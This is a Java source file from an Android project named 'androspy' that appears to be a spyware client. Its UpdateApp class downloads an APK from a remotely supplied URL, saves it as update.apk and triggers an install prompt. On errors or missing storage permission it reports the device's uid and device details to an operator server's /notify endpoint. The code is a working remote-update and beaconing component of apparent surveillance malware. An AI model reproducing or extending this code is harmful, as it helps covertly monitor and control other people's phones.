package buddy.ap.com.androspy;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Environment;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;

import http.Http;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class UpdateApp extends AsyncTask<String, Void, Void> {
    private static final String TAG = "UpdateApp";
    public static final String PKG_FILE = "update.apk";
    private Client client;
    private CommonParams commonParams;

    public void setClient(Client c) {
        this.client = c;
        this.commonParams = new CommonParams(c);
    }

    @Override
    protected Void doInBackground(String... arg0) {

        if (ContextCompat.checkSelfPermission(client, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {

            try {
                URL url = new URL(arg0[0]);
                URLConnection c = url.openConnection();
                c.connect();

                File file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                file.mkdirs();
                File outputFile = new File(file, PKG_FILE);
                if (outputFile.exists()) {
                    outputFile.delete();
                }
                FileOutputStream fos = new FileOutputStream(outputFile);

                InputStream is = new BufferedInputStream(url.openStream());

                byte[] buffer = new byte[1024];
                int len1 = 0;
                while ((len1 = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, len1);
                    Log.i(TAG, "Downloading...");
                }
                fos.flush();
                fos.close();
                is.close();

                Log.i(TAG, "Download Complete!!!!!");

                Intent updateIntent = new Intent(client, PromptUpdateActivity.class);
                updateIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                client.startActivity(updateIntent);


            } catch (Exception e) {
                Log.e("UpdateAPP", "Update error! " + e.getMessage());
                HashMap noPermit = new HashMap();
                noPermit.put("event", "download:error");
                noPermit.put("uid", commonParams.getUid());
                noPermit.put("device", commonParams.getDevice());
                noPermit.put("error", "Download failed");
                Http doneSMS = new Http();
                doneSMS.setUrl(commonParams.getServer() + "/notify");
                doneSMS.setMethod("POST");
                doneSMS.setParams(noPermit);
                doneSMS.execute();

            }
        } else {
            Log.e(TAG, "No WRITE_EXTERNAL_STORAGE permission!!!");
            HashMap noPermit = new HashMap();
            noPermit.put("event", "nopermission");
            noPermit.put("uid", commonParams.getUid());
            noPermit.put("device", commonParams.getDevice());
            noPermit.put("permission", "WRITE_EXTERNAL_STORAGE");
            Http doneSMS = new Http();
            doneSMS.setUrl(commonParams.getServer() + "/notify");
            doneSMS.setMethod("POST");
            doneSMS.setParams(noPermit);
            doneSMS.execute();

            //ask permissions
            Intent i = new Intent(client, MainActivity.class);
            i.addFlags(FLAG_ACTIVITY_NEW_TASK);
            client.startActivity(i);
        }
        return null;
    }
}